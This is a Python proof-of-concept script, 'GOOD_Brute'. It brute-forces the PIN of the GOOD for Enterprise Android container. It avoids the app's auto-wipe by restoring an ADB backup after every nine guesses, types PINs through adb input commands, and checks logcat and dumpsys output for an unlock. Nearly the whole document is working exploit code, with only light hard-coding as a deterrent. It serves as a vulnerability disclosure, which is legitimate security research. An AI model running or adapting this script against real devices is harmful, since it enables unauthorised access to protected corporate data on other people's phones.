#!/usr/bin/python
# -*- coding:utf8 -*-

"""

    GOOD_Brute
    ----------

    GOOD_Brute is a Proof of Concept Python script to perform brute_force on the
    GOOD for Enterprise Android container (version 2.2.2.268 and prior).

    This script relies on the ability to perform an ADB backup/restore on the
    GOOD for Enterprise container to bypass the implemented auto-wipe feature.

    The underlying communication with the Android device (or virtual machine)
    uses ADB, and as such USB debugging must be enabled.

    As this PoC is designed to show the possibility that GOOD for Entperise can
    be brute forced in specific versions, most of the values are hard-coded to
    prevent script kiddies from using it out of the box.

"""

__version__ = "0.6_poc"
__codename__ = "Deepsec"
__description__ = "Brute forces a GOOD for Enterprise Android Container"
__contact__ = "Chris John Riley"

# All variables are hard-coded, please edit prior to using or testing in your
# own lab environment.

import os
from time import sleep, time
import re
import signal
import optparse

debug = False
# estimated restore timeout (time taken to perform adb restore action)
restore_timeout = 15
# estiamted time to start GOOD for Enterprise initially and after restore action
startup_timeout = 3
# estimated time to unlock GOOD for Enterprise after entering correct pin
unlock_timeout = 8
# GOOD for Enterprise Android Backup file
# note: Must be backed up with 10 tries remaining
backup_filename = "./good.ab"
# GOOD for Entperise startup intent - used to start GOOD
start_intent = "-a android.intent.action.MAIN -c android.intent.category.LAUNCHER com.good.android.gfe/com.good.android.ui.LaunchHomeActivity"
# used for unlocking PIN protected device prior to brute force (if required)
device_pin = "1234"
# value to prepend to every pin attempt (useful if partial PIN is known)
prepin = ""
# record start time for stats
start_time = time()
# initialise pin tries counter
pintries = 0
# record number of false alarms encountered
falsealarms = 0
# set dictionary file - leave blank for basic 0000 - 9999 brute-force
dict = "./pins.txt"
# ADB connection string - use serial or TCP of target
#adb_cmd = "adb -s 4df178f8345c6fc3"
adb_device = "10.0.0.66:5555"
adb_cmd = "adb -s " + adb_device

# static regex matches to detect possible GOOD for Enterprise unlock
relocked = re.compile("mFocusedActivity\: ActivityRecord{.* com.good.android.gfe\/com.good.android.ui.activities.AppLockActivity}")
reunlocked = re.compile("mFocusedActivity\: ActivityRecord{.* com.good.android.gfe\/com.good.android.ui.activities.HomeScreenActivity}")
# first unlock results in DeviceAdminAdd or ActivateDeviceAdministratorActivity and not full unlock
# this will trigger a sleep process and recheck to see if the container is fully open
reunlocked_first = re.compile("mFocusedActivity\: ActivityRecord{.* com.android.settings\/.DeviceAdminAdd}")
reunlocked_first2 = re.compile("mFocusedActivity\: ActivityRecord{.* com.good.android.gfe\/com.good.android.ui.activities.ActivateDeviceAdministratorActivity}")

def main():
	# ascii art
	about()
	# check backup exists
	setup()
	# check device is unlocked
	devicelock()
	# check GOOD is running
	if checkgood():
		print " [!] Can't brute-force an open container!!!"
		exit(0)
	# clear logcat
	if debug:
		print " [ ] Clearing logcat"
	os.system(adb_cmd + ' logcat -c')
	brute_handler()# send GOOD pin

def brute_handler():
	# perform brute-force
	if not dict:
		# brute-force pins using the old fashioned method
		print " [ ] Using plain brute-force - no dictionary supplied"
		pin_ends = list(xrange(100))
		pin_ends.reverse()
	elif not os.path.isfile(dict):
		print " [!] dictionary supplied is not readable"
		exit(1)
	else:
		# read in dictionary
		print " [ ] Reading PINs from dictionary file %s" % dict
		pin_ends = []
		for line in open(dict):
			li=line.strip()
			if not li.startswith("#"):
				pin_ends.append(line.rstrip())

	# start brute-force
	iter = 9
	for pin in pin_ends:
		if not pin[0] == "#": # skip comment lines
			if iter == 9:
				# only try 9 then restore from backup file
				# restore GOOD data
				goodrestore(backup_filename)
				print " [ ] Status: %s PINs tested / %s PINS remaining" % (pintries, (len(pin_ends) - pintries))
				iter = 0 # reset iter counter
			# else try next pin
			sendgoodpin(prepin + str(pin))
			iter = iter + 1

def about():

	logo = '''\n\n

  ,ad8888ba,    ,ad8888ba,     ,ad8888ba,   88888888ba,
 d8"'    `"8b  d8"'    `"8b   d8"'    `"8b  88      `"8b
d8'           d8'        `8b d8'        `8b 88        `8b
88            88          88 88          88 88         88
88      88888 88          88 88          88 88         88
Y8,        88 Y8,        ,8P Y8,        ,8P 88         8P
 Y8a.    .a88  Y8a.    .a8P   Y8a.    .a8P  88      .a8P
  `"Y88888P"    `"Y8888Y"'     `"Y8888Y"'   88888888Y"'
        88
        88                                   ,d
        88                                   88
        88,dPPYba,  8b,dPPYba, 88       88 MM88MMM ,adPPYba,
        88P'    "8a 88P'   "Y8 88       88   88   a8P_____88
        88       d8 88         88       88   88   8PP"""""""
        88b,   ,a8" 88         "8a,   ,a88   88,  "8b,   ,aa
        8Y"Ybbd8"'  88          `"YbbdP'Y8   "Y888 `"Ybbd8"'

                                    VERSION ::: %s (%s)
\n''' % (__version__, __codename__)
	print logo

def setup():
	# check if files exist and ADB connection to device is working

	if not os.path.isfile(backup_filename):
		print " [X] Backup file %s does not exist... exiting" % backup_filename
		exit(1)
	print " [ ] Checking connection to ADB device %s" % adb_device
	res = os.popen('adb connect ' + adb_device).read()
	if "connected" in res:
		print " [ ] Connected to %s" % adb_device
	elif "unable" in res:
		print " [!] Unable to connect"
		print res
		exit(1)


def sendgoodpin(pin):
	# send PIN to device and check for unlock

	print " [>] Testing GOOD PIN ::: %s" % pin
	global pintries
	pintries = pintries + 1 # keep track of pin tries
	os.system(adb_cmd + ' shell input text ' + pin)
	os.system(adb_cmd + ' shell input keyevent ENTER')
	checkunlock(pin)

def checkunlock(pin):
	# track unlock using logcat

	global falsealarms # track false alarms globally
	# check unlock
	if debug: print " [?] Checking logcat GOOD open checks"
	# add slight pause to allow for unlock to begin
	sleep(0.2)
	# check initial point of reference for unlock (only indicates possible unlock, may occur more than once)
	res = os.popen(adb_cmd + ' logcat -d dalvikvm:V *.S | grep /data/data/com.good.android.gfe/lib/ | grep open')
	res = res.read()
	if res:
		print "\n [!] Looks good for GOOD... Double Checking... PLS HOLD CALLER!"
		# pause and check GOOD is really open now - false positives happen

		os.system(adb_cmd + ' logcat -c')
		sleep(unlock_timeout)
		if debug: print os.popen(adb_cmd + ' shell dumpsys activity | grep Activity:').read()
		if checkgood(): # check unlock
			print " [!] We win... code is %s\n" % str(pin)
			print "    [-] Runtime: %.2f seconds" % (time() - start_time)
			print "    [-] Registered False Alarms %s" % str(falsealarms)
			print "    [-] %s PINs tested" % str(pintries)
			print "    [-] Speed: %.2f PINs per minute" % ((pintries / (time() - start_time)) * 60 )
			print "    [-] Estimated: 5000 PINs in %.2f hours\n\n" % (((5000 / (pintries / (time() - start_time))) /60)/60)
			exit(0)
		else:
			print " [X] Good container still locked up tight... sorry, false alarm"
			# record false alarms for statistics
			falsealarms = falsealarms + 1
			os.system(adb_cmd + ' logcat -c')

def checkgood():
	# check if good is unlocked

	res = os.popen(adb_cmd + ' shell dumpsys activity')
	res = res.read()
	if debug: print os.popen(adb_cmd + ' shell dumpsys activity | grep Activity:').read()

	if relocked.search(res):
		if debug: print " [X] Good container currently Locked"
		return False
	elif reunlocked.search(res):
		print " [!] Good container already Unlocked!"
		return True
	elif reunlocked_first.search(res) or reunlocked_first2.search(res):
		print " [!] Good Container unlocked... accept add Administrator to continue"
		return True
	else:
		if debug: print " [?] GOOD container Unlocking or not running... double checking"
		# give GOOD time to start - time depends on physical vs. virtual device
		sleep(startup_timeout)
		if reunlocked.search(res) or reunlocked_first.search(res):
			print " [!] GOOD Unlocked!"
			return True
		else:
			print " [>] GOOD not running...",
			res = os.popen(adb_cmd + ' shell am start ' + start_intent)
			res = res.read().split("{")
			print " [<] %s" % str(res[0])
			print "    [<] %s" % str(res[1].split(" ")[1])
			print "    [<] %s" % str(res[1].split(" ")[2])
			print "    [<] %s" % str(res[1].split(" ")[3])
			# confirm if good is now running
			sleep(startup_timeout)
			checkgood()

def devicelock():
	# check for and unlock device PIN (if needed)

	print " [?] Checking lock and sending pin if required"
	res = os.popen(adb_cmd + ' shell dumpsys window policy')
	res = res.read()
	if "mScreenOnFully=false" in res:
		print " [!] Waking up device by sending power key"
		os.system(adb_cmd + ' shell input keyevent 26')
	res = os.popen(adb_cmd + ' shell dumpsys activity')
        res = res.read()
	if "mLockScreenShown" in res:
		print " [!] Device locked, sending device PIN"
		senddevicepin()

def senddevicepin():
	# send pin and enter

	os.system(adb_cmd + ' shell input text ' + device_pin)
	os.system(adb_cmd + ' shell input keyevent ENTER')
	print " [<] Device PIN sent, device unlocked"

def goodrestore(filename):
	# perform restore of GOOD container

	print " [<] Closing GOOD and restoring data"
	os.system(adb_cmd + ' shell input keyevent 3')
	res = os.popen(adb_cmd + ' restore ' + str(filename) + ' &')
	# wait for prompt and accept
	sleep(1)
	acceptrestore()
	# allow restore to complete
	checkrestore()
	# check good is open
	sleep(0.1)
	checkgood()

def checkrestore():
	# check restore is complete

	if debug: print " [?] Checking restore is complete"
	iter = 0
	sleep(1)
	print " [<]",
	while iter < (restore_timeout*2):
		res = os.popen(adb_cmd + ' logcat -d BackupManagerService:I *:S | grep -i "Full restore processing complete"')
		if res.read():
			print "Restore complete, continuing brute-force"
			# clear logcat to keep size down
			os.system(adb_cmd + ' logcat -c')
			return
		else:
			print ".",
			iter = iter +1
			sleep(0.5)
	print " [X] Restore took longer than expected... exiting"
	exit(1)


def acceptrestore():
	# send touch events to accept backup
	# coorindinates set for 720x1280 or 800x600 displays YMMV

	if debug: print " [?] Checking screen resolution :::"
	result = os.popen(adb_cmd + ' shell dumpsys window | grep Display\:')
	result = result.read()

	if "init=720x1280" in result:
		if debug: print " [<] Screen resolution matches 720x1280"
		coordinates = [533, 1245]
		if debug: print " [ ] Sending touch event to accept restore"
		os.system(adb_cmd + ' shell input tap ' + str(coordinates[0]) + ' ' + str(coordinates[1]))
	elif "init=800x600" in result:
		if debug: print " [<] Screen resolution matches 800x600 (tablet)"
		coordinates = [573, 588]
		if debug: print " [ ] Sending touch event to accept restore"
		os.system(adb_cmd + ' shell input tap ' + str(coordinates[0]) + ' ' + str(coordinates[1]))
	else:
		print " [X] Screen resolution does not match... unable to perform touch"
		exit(1)

def handler(signum, frame):
	# handle ctrl-c kill and provide information on runtime

	print " [X] CTRL-C DETECTED\n"
	print "    [-] Runtime: %.2f seconds" % (time() - start_time)
	print "    [-] %s PINs tested" % str(pintries)
	print "    [-] Speed: %.2f PINs per minute" % ((pintries / (time() - start_time)) * 60 )
	print "    [-] Estimated: 5000 PINs in %.2f hours" % (((5000 / (pintries / (time() - start_time))) /60)/60)
	exit(1)

# ctrl-c handler
signal.signal(signal.SIGINT, handler)

# kick things off
main()